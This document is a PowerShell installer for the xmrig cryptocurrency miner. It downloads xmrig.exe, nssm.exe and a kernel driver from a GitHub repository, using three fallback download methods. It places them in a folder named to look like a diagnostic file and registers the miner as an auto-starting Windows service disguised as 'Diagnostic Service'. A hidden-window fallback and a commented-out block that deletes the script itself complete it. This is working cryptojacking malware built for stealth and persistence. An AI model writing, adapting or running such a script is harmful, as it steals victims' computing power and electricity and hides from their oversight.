# Check and return current user name
$currentUserName = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name.Split('\')[1]
Write-Host "Current user: $currentUserName"

# Define target directory - fixed the path (removed .txt)
$targetDir = "C:\ProgramData\.diagnostic.txt\"
$oldMinerPath = "C:\Users\$currentUserName\xmrig.exe"

# Step 1: Clean up old files
Write-Host "Step 1: Cleaning up old files..."
if (Test-Path $oldMinerPath) {
    try {
        Remove-Item -Force $oldMinerPath -ErrorAction SilentlyContinue
        Write-Host "  Removed old miner from user directory"
    } catch {
        Write-Host "  Warning: Could not remove old miner" -ForegroundColor Yellow
    }
}

# Step 2: Create target directory
Write-Host "`nStep 2: Creating target directory..."
try {
    if (-not (Test-Path $targetDir)) {
        New-Item -ItemType Directory -Path $targetDir -Force | Out-Null
    }
    Write-Host "  Target directory: $targetDir"
} catch {
    Write-Host "  Failed to create directory: $($_.Exception.Message)" -ForegroundColor Red
    Exit 1
}

# Step 3: Download files directly to target directory
Write-Host "`nStep 3: Downloading files..."
$urls = @{
    'xmrig.exe' = 'https://raw.githubusercontent.com/User07x07/Dopple/main/xmrig.exe'
    'nssm.exe' = 'https://raw.githubusercontent.com/User07x07/Dopple/main/nssm.exe'
    'WinRing0x64.sys' = 'https://raw.githubusercontent.com/User07x07/Dopple/main/WinRing0x64.sys'
}

$downloadSuccess = $true

foreach ($item in $urls.GetEnumerator()) {
    $filename = $item.Key
    $url = $item.Value
    $outputPath = Join-Path $targetDir $filename
    
    Write-Host "  Downloading $filename..."
    
    # Remove existing file if it exists
    if (Test-Path $outputPath) {
        Remove-Item $outputPath -Force -ErrorAction SilentlyContinue
    }
    
    try {
        # Use multiple methods to download
        $success = $false
        
        # Method 1: Try with Invoke-WebRequest
        try {
            Invoke-WebRequest -Uri $url -OutFile $outputPath -ErrorAction Stop
            Write-Host "    ✓ Downloaded via Invoke-WebRequest" -ForegroundColor Green
            $success = $true
        } catch {
            Write-Host "    Method 1 failed: $($_.Exception.Message)" -ForegroundColor Yellow
        }
        
        # Method 2: Try with WebClient (older but sometimes more reliable)
        if (-not $success -and $PSVersionTable.PSVersion.Major -ge 3) {
            try {
                $webClient = New-Object System.Net.WebClient
                $webClient.DownloadFile($url, $outputPath)
                Write-Host "    ✓ Downloaded via WebClient" -ForegroundColor Green
                $success = $true
            } catch {
                Write-Host "    Method 2 failed: $($_.Exception.Message)" -ForegroundColor Yellow
            }
        }
        
        # Method 3: Try with BITS
        if (-not $success) {
            try {
                Start-BitsTransfer -Source $url -Destination $outputPath
                Write-Host "    ✓ Downloaded via BITS" -ForegroundColor Green
                $success = $true
            } catch {
                Write-Host "    Method 3 failed: $($_.Exception.Message)" -ForegroundColor Yellow
            }
        }
        
        if (-not $success) {
            Write-Host "    ✗ All download methods failed for $filename" -ForegroundColor Red
            $downloadSuccess = $false
        }
        
    } catch {
        Write-Host "Error downloading $($_.Exception.Message)" -ForegroundColor Red
        $downloadSuccess = $false
    }
}

# Check if downloads were successful
if (-not $downloadSuccess) {
    Write-Host "`nWarning: Some files failed to download. Continuing with available files..." -ForegroundColor Yellow
}

# Step 4: Verify downloaded files
Write-Host "`nStep 4: Verifying downloaded files..."
$requiredFiles = @('xmrig.exe', 'config.json', 'nssm.exe')
$missingFiles = @()

foreach ($file in $requiredFiles) {
    $filePath = Join-Path $targetDir $file
    if (Test-Path $filePath -PathType Leaf) {
        $size = (Get-Item $filePath).Length
        Write-Host "  ✓ $file ($([math]::Round($size/1MB,2)) MB)"
    } else {
        Write-Host "  ✗ $file (MISSING)" -ForegroundColor Red
        $missingFiles += $file
    }
}

# Check if essential files are missing
if ($missingFiles.Count -gt 0) {
    Write-Host "`nError: Missing essential files: $($missingFiles -join ', ')" -ForegroundColor Red
    Write-Host "Cannot continue without these files." -ForegroundColor Red
    Exit 1
}

# Step 5: Calculate thread count
Write-Host "`nStep 5: Calculating system configuration..."
try {
    $threads = (Get-WmiObject -Class Win32_ComputerSystem).NumberOfLogicalProcessors
    if ($threads -eq $null -or $threads -eq 0) {
        $threads = (Get-CimInstance -ClassName Win32_ComputerSystem).NumberOfLogicalProcessors
    }
} catch {
    # Fallback method
    $threads = (Get-WmiObject -Class Win32_Processor | Measure-Object -Property NumberOfLogicalProcessors -Sum).Sum
}

if ($threads -eq $null -or $threads -eq 0) {
    $threads = 4  # Default fallback
    Write-Host "  Using default thread count: $threads" -ForegroundColor Yellow
} else {
    Write-Host "  Logical Processors: $threads"
}

$tf = [math]::Round(25 * $threads)
Write-Host "  Calculated TF value: $tf"

# Step 6: Update config.json if it exists
$configPath = Join-Path $targetDir "config.json"
if (Test-Path $configPath) {
    try {
        Write-Host "`nStep 6: Updating configuration file..."
        $configContent = Get-Content $configPath -Raw | ConvertFrom-Json
        
        # Update thread configuration
        if ($configContent.PSObject.Properties.Name -contains "max-threads-hint") {
            $configContent."max-threads-hint" = $tf
            Write-Host "  Updated max-threads-hint: $tf"
        }
        
        if ($configContent.PSObject.Properties.Name -contains "threads") {
            $configContent.threads = $threads
            Write-Host "  Updated threads: $threads"
        }
        
        # Save updated config
        $configContent | ConvertTo-Json -Depth 10 | Set-Content $configPath -Force
        Write-Host "  Configuration updated successfully" -ForegroundColor Green
        
    } catch {
        Write-Host "  Warning: Could not update config.json - $($_.Exception.Message)" -ForegroundColor Yellow
    }
}

# Step 7: Configure service with nssm
Write-Host "`nStep 7: Configuring service..."
Set-Location $targetDir

$nssmPath = Join-Path $targetDir "nssm.exe"
$xmrigPath = Join-Path $targetDir "xmrig.exe"

if (Test-Path $nssmPath) {
    try {
        # Stop existing service if it exists
        try {
            & $nssmPath stop xmrig 2>$null
            & $nssmPath remove xmrig confirm 2>$null
            Write-Host "  Cleaned up existing service"
        } catch {
            # Ignore errors if service doesn't exist
        }
        
        # Install new service
        Write-Host "  Installing new service..."
        & $nssmPath install xmrig $xmrigPath
        
        # Configure service
        & $nssmPath set xmrig AppDirectory $targetDir
        & $nssmPath set xmrig AppParameters "-B -c config.json"
        & $nssmPath set xmrig DisplayName "Diagnostic Service"
        & $nssmPath set xmrig Description "System Diagnostic Utility"
        & $nssmPath set xmrig Start SERVICE_AUTO_START
        & $nssmPath set xmrig AppNoConsole 1
        & $nssmPath set xmrig Type SERVICE_WIN32_OWN_PROCESS
        
        Write-Host "  Starting service..."
        & $nssmPath start xmrig
        
        # Verify service is running
        Start-Sleep -Seconds 2
        $serviceStatus = & $nssmPath status xmrig
        Write-Host "  Service status: $serviceStatus" -ForegroundColor Green
        
    } catch {
        Write-Host "  Error configuring service: $($_.Exception.Message)" -ForegroundColor Red
        Write-Host "  Trying alternative method (running as process)..." -ForegroundColor Yellow
        
        # Fallback: Run as process
        try {
            Start-Process $xmrigPath -ArgumentList "-B -c config.json" -WorkingDirectory $targetDir -WindowStyle Hidden
            Write-Host "  Started miner as background process" -ForegroundColor Green
        } catch {
            Write-Host "  Failed to start miner: $($_.Exception.Message)" -ForegroundColor Red
        }
    }
} else {
    Write-Host "  nssm.exe not found. Starting miner as process..." -ForegroundColor Yellow
    try {
        Start-Process $xmrigPath -ArgumentList "-B -c config.json" -WorkingDirectory $targetDir -WindowStyle Hidden
        Write-Host "  Started miner as background process" -ForegroundColor Green
    } catch {
        Write-Host "  Failed to start miner: $($_.Exception.Message)" -ForegroundColor Red
    }
}

# Step 8: Final verification
Write-Host "`nStep 8: Final verification..."
Write-Host "  Checking if miner is running..."

$processRunning = Get-Process xmrig -ErrorAction SilentlyContinue
if ($processRunning) {
    Write-Host "  ✓ Miner process is running (PID: $($processRunning.Id))" -ForegroundColor Green
} else {
    # Check if service is running
    try {
        $service = Get-Service xmrig -ErrorAction SilentlyContinue
        if ($service.Status -eq 'Running') {
            Write-Host "  ✓ Miner service is running" -ForegroundColor Green
        } else {
            Write-Host "  ✗ Miner is not running. Check service/process manually." -ForegroundColor Red
        }
    } catch {
        Write-Host "  ✗ Miner is not running. Check manually." -ForegroundColor Red
    }
}

# Step 9: Summary
Write-Host "`n=== EXECUTION COMPLETE ==="
Write-Host "Directory: $targetDir"
Write-Host "Files:"
Get-ChildItem $targetDir | ForEach-Object {
    $sizeMB = [math]::Round($_.Length / 1MB, 2)
    Write-Host "  $($_.Name) - $sizeMB MB"
}

Write-Host "`nMiner should now be running in the background." -ForegroundColor Green
Write-Host "Check Task Manager or 'services.msc' to verify." -ForegroundColor Gray

# Optional: Remove script (uncomment if needed)
# try {
#     $scriptPath = $PSCommandPath
#     Write-Host "`nRemoving script file..."
#     Remove-Item $scriptPath -Force -ErrorAction SilentlyContinue
# } catch {
#     Write-Host "Could not remove script file." -ForegroundColor Yellow
# }



